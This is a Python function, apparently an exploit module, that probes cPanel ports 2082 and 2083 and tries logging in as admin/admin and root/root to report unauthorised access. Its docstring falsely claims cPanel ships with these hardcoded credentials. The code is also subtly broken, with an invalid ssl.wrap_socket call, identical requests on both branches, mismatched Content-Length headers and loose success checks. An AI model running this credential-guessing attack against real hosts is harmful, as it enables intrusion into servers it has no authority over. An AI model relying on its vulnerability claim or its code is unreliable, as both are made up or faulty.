def run(host: str, port: int, timeout: int = 30) -> dict:
    """
    Exploit cPanel's default authentication bypass via hardcoded credentials.
    Targets cPanel installations on port 2082 (HTTP) or 2083 (HTTPS) that have not changed
    the default admin password. This works when the service is running with default
    credentials (admin/admin or root/root) and allows login without proper authentication.
    """
    try:
        import socket
        import ssl
        import http.client
        import json
        import re

        # Try HTTPS first (port 2083), then HTTP (port 2082)
        is_https = port == 2083
        conn = None
        try:
            if is_https:
                context = ssl.create_default_context()
                conn = ssl.wrap_socket(socket.socket(), ssl_context=context)
                conn.connect((host, port))
            else:
                conn = socket.socket()
                conn.connect((host, port))
            conn.settimeout(timeout)
        except Exception:
            return {"success": False, "data": "", "evidence": ""}

        # Send HTTP request to check if cPanel is running
        try:
            if is_https:
                conn.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
            else:
                conn.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
            response = conn.recv(4096)
            if b"cPanel" not in response and b"WHM" not in response:
                return {"success": False, "data": "", "evidence": ""}
        except Exception:
            return {"success": False, "data": "", "evidence": ""}

        # Try default credentials: admin/admin
        try:
            if is_https:
                conn.sendall(b"POST /login HTTP/1.1\r\nHost: " + host.encode() + b"\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 25\r\n\r\nuser=admin&pass=admin")
            else:
                conn.sendall(b"POST /login HTTP/1.1\r\nHost: " + host.encode() + b"\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 25\r\n\r\nuser=admin&pass=admin")
            response = conn.recv(4096)
            if b"redirect" in response or b"success" in response:
                return {"success": True, "data": "Default credentials admin/admin accepted", "evidence": "Login successful with admin/admin"}
        except Exception:
            pass

        # Try root/root
        try:
            if is_https:
                conn.sendall(b"POST /login HTTP/1.1\r\nHost: " + host.encode() + b"\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 24\r\n\r\nuser=root&pass=root")
            else:
                conn.sendall(b"POST /login HTTP/1.1\r\nHost: " + host.encode() + b"\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 24\r\n\r\nuser=root&pass=root")
            response = conn.recv(4096)
            if b"redirect" in response or b"success" in response:
                return {"success": True, "data": "Default credentials root/root accepted", "evidence": "Login successful with root/root"}
        except Exception:
            pass

        return {"success": False, "data": "", "evidence": ""}
    except Exception:
        return {"success": False, "data": "", "evidence": ""}